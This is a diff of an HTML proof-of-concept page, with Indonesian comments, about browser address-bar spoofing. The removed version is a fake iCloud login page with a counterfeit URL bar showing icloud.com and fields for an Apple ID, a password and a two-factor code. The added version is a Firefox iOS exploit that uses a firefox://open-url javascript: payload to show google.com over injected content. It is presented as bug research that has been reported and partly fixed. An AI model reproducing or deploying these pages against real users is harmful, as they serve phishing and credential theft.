@@ -1,94 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>iCloud - Sign In</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,sans-serif;background:#f5f5f7;height:100vh;overflow-x:hidden}
-.fake-bar{position:fixed;top:0;left:0;width:100%;height:48px;background:#fff;border-bottom:0.5px solid rgba(0,0,0,0.1);display:flex;align-items:center;padding:0 14px;z-index:9999}
-.fake-url{background:#e8e8ed;border-radius:8px;padding:6px 10px;width:100%;font-size:12px;color:#1c1c1e;display:flex;align-items:center;gap:4px}
-.fake-url .lock{width:10px;height:10px;background:#8e8e93;border-radius:2px;display:inline-block}
-.fake-url span{flex:1;text-align:center}
-.content{margin-top:55px;padding:20px;min-height:200vh}
-.card{background:#fff;border-radius:14px;padding:24px;max-width:400px;margin:40px auto;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,0.08)}
-.card .icon{margin:0 auto 16px}
-.card h1{font-size:22px;font-weight:600;color:#1c1c1e;margin-bottom:4px}
-.card p{font-size:13px;color:#8e8e93;margin-bottom:20px}
-.card input{width:100%;padding:14px;border:1.5px solid #d1d1d6;border-radius:10px;font-size:16px;margin-bottom:12px;background:#f9f9fb}
-.card button{width:100%;padding:14px;background:#007aff;color:#fff;border:none;border-radius:10px;font-size:17px;font-weight:600;cursor:pointer}
-.btn-trigger{margin-top:24px;padding:16px;display:block;width:100%;background:#34c759;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none}
-.note{position:fixed;bottom:0;left:0;width:100%;padding:10px;text-align:center;font-size:10px;color:#8e8e93;background:rgba(255,255,255,0.9);border-top:0.5px solid #ddd;z-index:9998}
-</style>
+    <title>Firefox iOS - URL Scheme Spoof PoC</title>
+    <meta charset="UTF-8">
 </head>
 <body>
-
-<div class="fake-bar" id="fakeBar">
-  <div class="fake-url">
-    <span class="lock"></span>
-    <span>https://www.icloud.com</span>
-  </div>
-</div>
-
-<div class="content">
-  <div class="card" id="card1">
-    <div class="icon" style="width:60px;height:60px;background:#369;border-radius:16px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:24px">☁</div>
-    <h1>Welcome to iCloud</h1>
-    <p>Sign in to access your photos, files, and more.</p>
-    <input type="text" placeholder="Apple ID">
-    <input type="password" placeholder="Password">
-    <button>Sign In</button>
-  </div>
-
-  <button class="btn-trigger" id="triggerBtn">👇 Click Here to Continue</button>
-  
-  <div style="height:400px;"></div>
-</div>
-
-<div class="note">PoC Address Bar Spoof · iPhone 12 Mini iOS 26.4.2</div>
-
-<script>
-(function(){
-  var fakeBar = document.getElementById('fakeBar');
-  var triggerBtn = document.getElementById('triggerBtn');
-  var card = document.getElementById('card1');
-  var hidden = false;
-
-  // Saat scroll, real address bar auto-hide, fake bar tetap terlihat
-  window.addEventListener('scroll', function(){
-    if (window.scrollY > 60 && !hidden) {
-      hidden = true;
-    } else if (window.scrollY < 10 && hidden) {
-      hidden = false;
-    }
-  }, {passive:true});
-
-  // Saat klik — ubah fake bar untuk menambah kredibilitas
-  triggerBtn.addEventListener('click', function(){
-    triggerBtn.style.background = '#007aff';
-    triggerBtn.textContent = '⏳ Loading...';
+    <h1>Firefox iOS Bug PoC: Address Bar Spoofing</h1>
+    <p>Klik tombol di bawah untuk menguji spoofing address bar menggunakan firefox://open-url scheme.</p>
     
-    setTimeout(function(){
-      card.innerHTML = '<h2 style="color:#1c1c1e;margin-bottom:12px">🔐 Two-Factor Authentication</h2>' +
-        '<p style="font-size:14px;color:#8e8e93;margin-bottom:20px">Enter the verification code sent to your iPhone 12 Mini.</p>' +
-        '<input type="text" placeholder="6-digit code" maxlength="6" style="text-align:center;font-size:24px;letter-spacing:8px">' +
-        '<button>Verify</button>' +
-        '<div style="margin-top:20px;padding:12px;background:#fff3cd;border-radius:10px;font-size:11px;color:#856404;border:1px solid #ffc107">' +
-        '<strong>✅ ADDRESS BAR SPOOF</strong><br>Address bar di atas menunjukkan: <strong>https://www.icloud.com</strong><br>Ketuk area atas layar untuk reveal real domain.</div>';
-      
-      triggerBtn.textContent = '✅ Verified';
-      triggerBtn.style.background = '#34c759';
-      triggerBtn.disabled = true;
-      
-      console.log('═══════════════════════════════════');
-      console.log('SPOOF ACTIVE — Fake address bar: https://www.icloud.com');
-      console.log('SCROLL UP to see real address bar (domain attacker)');
-      console.log('iPhone 12 Mini iOS 26.4.2 — Safari');
-      console.log('═══════════════════════════════════');
-    }, 1000);
-  });
-})();
-</script>
+    <button onclick="exploit()" style="padding:15px;font-size:18px;background:red;color:white;border:none;border-radius:5px;">
+        Test Spoofing
+    </button>
+    
+    <script>
+        function exploit() {
+            // URL ini memanfaatkan firefox://open-url untuk menampilkan google.com
+            // di address bar padahal kontennya adalah HTML berbahaya
+            var payload = "firefox://open-url?url=javascript:" +
+                "//google.com%2Fsearch?q=secure%26source=%2F%250a" +
+                "document.body.innerHTML='<h1 style=color:red;font-size:48px>" +
+                "HACKED</h1><p>Address bar shows google.com but this is fake!</p>'";
+            
+            window.location.href = payload;
+        }
+    </script>
+    
+    <h2>Cara Kerja:</h2>
+    <p>1. Bug ini menggunakan skema URL <code>firefox://open-url</code></p>
+    <p>2. Parameter <code>javascript://google.com/...</code> membuat address bar</p>
+    <p>3. Tapi konten di-render dari skrip JavaScript, bukan dari google.com</p>
+    <p><strong>Catatan:</strong> Bug ini sudah dilaporkan dan sebagian sudah diperbaiki</p>
 </body>
 </html>
